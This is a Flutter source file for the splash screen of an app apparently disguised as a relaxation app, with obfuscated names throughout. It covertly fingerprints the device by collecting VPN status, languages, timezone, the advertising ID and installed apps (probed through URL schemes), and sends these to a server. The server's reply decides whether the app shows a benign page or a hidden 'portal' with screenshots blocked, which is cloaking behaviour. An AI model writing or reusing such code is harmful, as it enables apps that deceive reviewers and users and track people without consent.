import 'dart:async';
import 'dart:convert';

import 'package:adjust_sdk/adjust.dart';
import 'package:devicelocale/devicelocale.dart';
import 'package:flutter/material.dart';
import 'package:flutter_native_timezone/flutter_native_timezone.dart';
import 'package:minove/main.dart';
import 'package:minove/pages/softvibe_comfortvibefirst/relief_soothingstart.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/gMHADb5gxoVOkksOtxSU37R.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/j4GZTwvN3zqPn02qB8NgNE7XNW.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/ueSt9fbtfNCtCYxV2vRYzEhi.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/xRxOROB3MBGYz2vPgTIGCOpa.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/xXXSgJ.dart';
import 'package:screen_protector/screen_protector.dart';
import 'package:system_keyboard_languages/system_keyboard_languages.dart';
import 'package:url_launcher/url_launcher_string.dart';
import 'package:vpn_detector/vpn_detector.dart';

class Ajyhowkzgrbyjcpkmio0fqybabd extends StatefulWidget {
  const Ajyhowkzgrbyjcpkmio0fqybabd({super.key});

  @override
  State<Ajyhowkzgrbyjcpkmio0fqybabd> createState() =>
      _Ajyhowkzgrbyjcpkmio0fqybabdState();
}

class _Ajyhowkzgrbyjcpkmio0fqybabdState
    extends State<Ajyhowkzgrbyjcpkmio0fqybabd> {
  final _EntryScout _entryScout = _EntryScout();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      unawaited(_beginEntryDrift());
    });
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        resizeToAvoidBottomInset: false,
        body: Container(
          width: double.infinity,
          height: double.infinity,
          decoration: const BoxDecoration(
            image: DecorationImage(
              image: AssetImage('assets/images/klchaqu_start.png'),
              fit: BoxFit.cover,
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _beginEntryDrift() async {
    final dynamic envelope = await _entryScout.waitForEnvelope();
    if (!mounted) {
      return;
    }

    final _GateDecision decision = await _shapeGateDecision(envelope);
    await _applyGateDecision(decision);
  }

  Future<_GateDecision> _shapeGateDecision(dynamic envelope) async {
    final bool success = envelope['code'] == '0000';
    if (!success) {
      Gmhadb5gxovokksotxsu37r.jgFyoQPV8x = false;
      bEKjev1QCbvsAPb6tG.bEsUbz = false;
      return const _GateDecision.relief();
    }

    unawaited(_shieldViewport());
    Gmhadb5gxovokksotxsu37r.jgFyoQPV8x = true;

    final Map<String, dynamic> payload = yYFcGEvHo5sVSWPhq6HOyp9i(envelope);
    Gmhadb5gxovokksotxsu37r.vrNWj3 = payload['openValue'];
    uL9B64A.ulMStsVZoruk88UM = payload['locationFlag'] == 1;

    final bool shouldOpenPortal =
        payload['loginFlag'] == 1 &&
        Gmhadb5gxovokksotxsu37r.l1VskgSPXa98tRAoIzsaPzybUHC.isNotEmpty;

    bEKjev1QCbvsAPb6tG.bEsUbz = shouldOpenPortal;
    return shouldOpenPortal
        ? const _GateDecision.portal()
        : const _GateDecision.relief();
  }

  Future<void> _applyGateDecision(_GateDecision decision) async {
    if (decision.opensPortal) {
      UQDNs.kdVl0(const Xrxorob3mbgyz2vpgtigcopa());
      return;
    }

    UQDNs.kdVl0(const ReliefSoothingstart());
  }

  Future<void> _shieldViewport() async {
    await ScreenProtector.preventScreenshotOn();
    await ScreenProtector.protectDataLeakageWithBlur();
  }
}

class _EntryScout {
  final _DeviceSignalNest _deviceSignalNest = _DeviceSignalNest();

  Future<dynamic> waitForEnvelope() async {
    for (;;) {
      final dynamic packet = await _requestEnvelope();
      if (packet != null) {
        return packet;
      }
      await Future<void>.delayed(const Duration(seconds: 1));
    }
  }

  Future<dynamic> _requestEnvelope() async {
    return J4GZTwvN3zqPn02qB8NgNE7XNW.wO3ImBUD7vMJgZ0q(
      '/opi/v1/dL4kjmf8c0MoWo',
      await _deviceSignalNest.collect(),
    );
  }
}

class _DeviceSignalNest {
  Future<Map<String, dynamic>> collect() async {
    return {
      "zuWIcPO3tDlLWWW9DrjEd": 1,
      "rz6NzcqOrgOUkvn": await _vpnFlag(),
      "wrlVMeblGKQj3SKVEe": await _preferredLanguages(),
      "f2XfXgcrm5doBs0CrVVEs": await _installedAppMarks(),
      "fzMhjeU3BesfPfsKFVT0tiBt":
          await FlutterNativeTimezone.getLocalTimezone(),
      "rzcohv9ztYdMWMRRc68Cas4c9r8Rk": await SystemKeyboardLanguages()
          .languages(),
      "o3eZ42dwi97X9TzUTg": 1,
      "tgBEDh9UeagsgcWXHT2Ga":
          await Uest9fbtfnctcyxv2vryzehi.gnvsClZu3lyUJuKU9lTQJWVLFmHUYv,
      "d4mkqn2SH4t4cBTxzPUxCsi": await Adjust.getAdid(),
    };
  }

  Future<int> _vpnFlag() async {
    final VpnStatus status = await VpnDetector().isVpnActive();
    return status == VpnStatus.active ? 1 : 0;
  }

  Future<List<String>> _preferredLanguages() async {
    final List<dynamic>? languages = await Devicelocale.preferredLanguages;
    return (languages ?? const <dynamic>[]).cast<String>();
  }

  Future<List<String>> _installedAppMarks() async {
    final List<String> marks = <String>[];
    for (final _LaunchStamp stamp in _knownLaunchStamps) {
      if (await canLaunchUrlString('${stamp.scheme}://')) {
        marks.add(stamp.label);
      }
    }
    return marks;
  }
}

class _GateDecision {
  final bool opensPortal;

  const _GateDecision._(this.opensPortal);

  const _GateDecision.portal() : this._(true);
  const _GateDecision.relief() : this._(false);
}

Map<String, dynamic> yYFcGEvHo5sVSWPhq6HOyp9i(
  Map<String, dynamic> to1c9grTdIrjxjs,
) {
  return jsonDecode(
    (to1c9grTdIrjxjs['result'] as String).jOAN1d7VYww3v2gXjwHm(),
  );
}

class _LaunchStamp {
  final String label;
  final String scheme;

  const _LaunchStamp(this.label, this.scheme);
}

const List<_LaunchStamp> _knownLaunchStamps = <_LaunchStamp>[
  _LaunchStamp('WhatsApp', 'whatsapp'),
  _LaunchStamp('Instagram', 'instagram'),
  _LaunchStamp('Facebook', 'fb'),
  _LaunchStamp('TikTok', 'tiktok'),
  _LaunchStamp('GoogleMaps', 'comgooglemaps'),
  _LaunchStamp('twitter', 'tweetie'),
  _LaunchStamp('qq', 'mqq'),
  _LaunchStamp('weiChat', 'wechat'),
  _LaunchStamp('Aliapp', 'alipay'),
];
